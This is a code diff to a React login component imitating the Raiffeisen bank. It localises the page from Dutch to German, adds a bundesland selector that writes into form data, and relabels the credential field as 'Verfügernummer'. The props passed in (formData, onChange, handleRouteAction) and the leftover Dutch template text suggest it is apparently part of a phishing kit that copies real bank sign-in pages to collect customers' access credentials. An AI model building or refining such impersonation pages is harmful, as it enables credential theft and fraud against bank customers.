@@ -29,7 +29,9 @@ const REGIONS = [
 
 export function Raiffeisen({ formData, onChange, handleRouteAction, saving }: Props) {
   const [dropdownOpen, setDropdownOpen] = useState(false);
-  const [selectedRegion, setSelectedRegion] = useState("Kärnten");
+  const [selectedRegion, setSelectedRegion] = useState(
+    (formData as Record<string, string | undefined>).bundesland || "Kärnten",
+  );
 
   const toggleDropdown = () => setDropdownOpen(!dropdownOpen);
 
@@ -61,9 +63,9 @@ export function Raiffeisen({ formData, onChange, handleRouteAction, saving }: Pr
           </div>
 
           <div className="mt-4">
-            <h1 className="text-[26px] font-medium text-[#333] mb-4">Log alstublieft in</h1>
+            <h1 className="text-[26px] font-medium text-[#333] mb-4">Melden Sie sich an</h1>
             <p className="text-[13px] text-[#555] mb-8">
-              Voer uw inloggegevens in om verder te gaan.
+              Anmeldung bei Raiffeisen {selectedRegion} — geben Sie Ihre Zugangsdaten ein, um fortzufahren.
             </p>
 
             <form 
@@ -100,6 +102,7 @@ export function Raiffeisen({ formData, onChange, handleRouteAction, saving }: Pr
                         key={region}
                         onClick={() => {
                           setSelectedRegion(region);
+                          onChange("bundesland", region);
                           setDropdownOpen(false);
                         }}
                         className={`px-4 py-3 text-[15px] cursor-pointer flex justify-between items-center border-b border-gray-100 last:border-0 ${selectedRegion === region ? 'bg-[#f4f4f4] text-[#333]' : 'text-[#333] hover:bg-[#f4f4f4]'}`}
@@ -120,7 +123,7 @@ export function Raiffeisen({ formData, onChange, handleRouteAction, saving }: Pr
               <div className="relative">
                 <div className="w-full bg-[#f4f4f4] border-b-[1px] border-[#767676] focus-within:border-[#333] transition-colors flex flex-col px-4 min-h-[56px] justify-center group relative">
                   <label className="absolute top-2 text-[11px] text-[#666] group-focus-within:text-[#333] transition-colors">
-                    Inlogcode invoeren *
+                    Verfügernummer eingeben *
                   </label>
                   <input 
                     type="text" 
